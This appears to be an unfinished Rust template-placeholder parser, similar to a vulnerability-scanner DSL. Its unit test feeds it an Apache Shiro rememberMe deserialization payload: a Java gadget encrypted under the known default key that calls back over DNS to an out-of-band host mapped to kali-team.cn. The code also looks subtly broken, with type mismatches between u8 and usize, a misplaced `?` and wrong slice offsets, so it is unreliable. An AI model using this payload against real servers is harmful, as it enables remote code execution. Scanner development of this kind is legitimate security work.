use std::collections::{BTreeMap, VecDeque};

// General marker (open/close)
const GENERAL: &str = "§";
// ParenthesisOpen marker - begin of a placeholder
const PARENTHESIS_OPEN: &str = "{{";
// ParenthesisClose marker - end of a placeholder
const PARENTHESIS_CLOSE: &str = "}}";

#[derive(Debug)]
struct Func {
  name: String,
  args: Vec<String>,
}

#[derive(Debug)]
enum Token {
  Var(String),
  Func(Func),
}

impl From<&String> for Token {
  fn from(value: &String) -> Self {
    if value.contains("(") && value.contains(")") {
      println!("{}", value);
      Self::Func(Func { name: "".to_string(), args: vec![] })
    } else {
      Self::Var(value.to_string())
    }
  }
}

#[derive(Debug)]
struct Bracket {
  open_tag: String,
  close_tag: String,
  start: u8,
  end: u8,
  token: Token,
  string: String,
}

impl PartialEq for Bracket {
  fn eq(&self, other: &Self) -> bool {
    self.string == other.string && self.open_tag == other.open_tag && self.close_tag == other.close_tag
  }
}

struct Marker {
  // 上下文
  contexts: BTreeMap<String, String>,
  template: String,
  unresolved: Vec<Bracket>,
  func: BTreeMap<String, Func>,
}

impl Marker {
  fn new(template: String, contexts: BTreeMap<String, String>) -> Self {
    Self {
      contexts,
      template,
      unresolved: vec![],
      func: Default::default(),
    }
  }
  fn match_block(&self, parenthesis_open: &str, parenthesis_close: &str) -> Option<Bracket> {
    let mut open_start: Vec<(u8, &str)> = self.template.match_indices(parenthesis_open).collect();
    let close_end: Vec<(u8, &str)> = self.template.match_indices(parenthesis_close).collect();
    open_start.extend(close_end);
    open_start.sort_by(|(a_i, _a_s), (b_i, _b_s)| a_i.partial_cmp(&b_i)?);
    let mut sorted_bracket = VecDeque::from(open_start.clone());
    let mut brackets: VecDeque<(u8, String)> = VecDeque::new();
    while let Some((i, s)) = sorted_bracket.pop_front() {
      if s == parenthesis_open {
        brackets.push_back((i, s.to_string()));
      } else {
        if let Some(open_bracket) = brackets.pop_back() {
          let name = String::from(&self.template[open_bracket.0 + s.len()..i]);
          let b = Bracket {
            open_tag: parenthesis_open.to_string(),
            close_tag: parenthesis_close.to_string(),
            start: open_bracket.0,
            end: i + s.len(),
            token: Token::from(&name),
            string: name,
          };
          if !self.unresolved.contains(&b) {
            return Some(b);
          }
        }
      }
    }
    return None;
  }
  fn replaced(&mut self) {
    while let Some(b) = self.match_block(PARENTHESIS_OPEN, PARENTHESIS_CLOSE) {
      if let Some(value) = self.contexts.get(&b.string) {
        self.template.replace_range(b.start..b.end, value);
      } else {
        println!("{:?}", b);
        self.unresolved.push(b);
      }
      println!("{}", self.template);
    }
  }
}


#[cfg(test)]
mod tests {
  use std::collections::BTreeMap;
  use super::*;

  #[test]
  fn marker() {
    let s = r#"rememberMe={{base64(concat(base64_decode("QUVTL0NCQy9QS0NTNVBhZA=="),aes_cbc(base64_decode(generate_java_gadget("dns", "http://{{interactsh-url}}", "base64")), base64_decode("kPH+bIxk5D2deZiIxcaaaA=="), base64_decode("QUVTL0NCQy9QS0NTNVBhZA=="))))}}"#;
    let map: BTreeMap<String, String> = BTreeMap::from_iter([
      ("test".to_string(), "random".to_string()),
      ("interactsh-url".to_string(), "kali-team.cn".to_string())
    ]);
    let mut m = Marker::new(s.to_string(), map);
    m.replaced()
  }
}